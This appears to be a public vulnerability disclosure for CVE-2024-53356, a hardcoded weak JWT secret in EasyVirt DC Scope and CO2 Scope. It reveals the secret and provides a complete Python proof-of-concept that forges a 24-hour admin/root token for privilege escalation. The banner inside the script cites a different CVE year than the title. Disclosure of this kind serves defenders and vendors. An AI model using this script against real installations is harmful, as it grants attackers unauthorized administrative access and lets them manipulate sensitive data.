# [CVE-2024-53356] - EasyVirt - Weak JWT Secret
#### Exploit Author: [Aurelien BOURDOIS](https://www.linkedin.com/in/aurelien-bourdois)
#### Date: 25-10-2024
#### Vendor: [EasyVirt](https://www.easyvirt.com/)
#### Vulnerable versions:
- DC Scope <= 8.6.0
- CO2 Scope <= 1.3.0


## Description:
Weak JWT Secret vulnerabilitiy in EasyVirt **DCScope <= 8.6.0** and **CO2Scope <= 1.3.0** allows remote attackers to generate JWT for privilege escalation. The HMAC secret used for generating tokens is hardcoded as "somerandomaccesstoken". A weak HMAC secret poses a risk because attackers can use the predictable secret to create valid JSON Web Tokens (JWTs), allowing them access to important information and actions within the application.

## Steps to reproduce:
1. Execute following script:
```py
import base64
import hmac
import hashlib
import json
import time

secret_key = 'somerandomaccesstoken'
iat = int(time.time())
# 24 hours validity
exp = iat + (24 * 60 * 60)

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "user": "root",
    "role": "admin",
    "iat": iat,
    "exp": exp
}

def base64_url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

encoded_header = base64_url_encode(json.dumps(header))
encoded_payload = base64_url_encode(json.dumps(payload))
jwt_without_signature = f"{encoded_header}.{encoded_payload}"

signature = hmac.new(secret_key.encode(), jwt_without_signature.encode(), hashlib.sha256).digest()
encoded_signature = base64.urlsafe_b64encode(signature).decode().rstrip("=")

jwt_token = f"{jwt_without_signature}.{encoded_signature}"
print('+-------------------------------------------+')
print('| Token generated to exploit CVE-2025-53356 |')
print('|                Validity: 24h              |')
print('+-------------------------------------------+\n')
print('Token:', jwt_token)
```
2. Uses the generated cookie

## IMPACT:
An attacker can gain unauthorized access by forging valid JWTs and impersonating legitimate users. This can lead to the manipulation of sensitive data and privilege escalation.
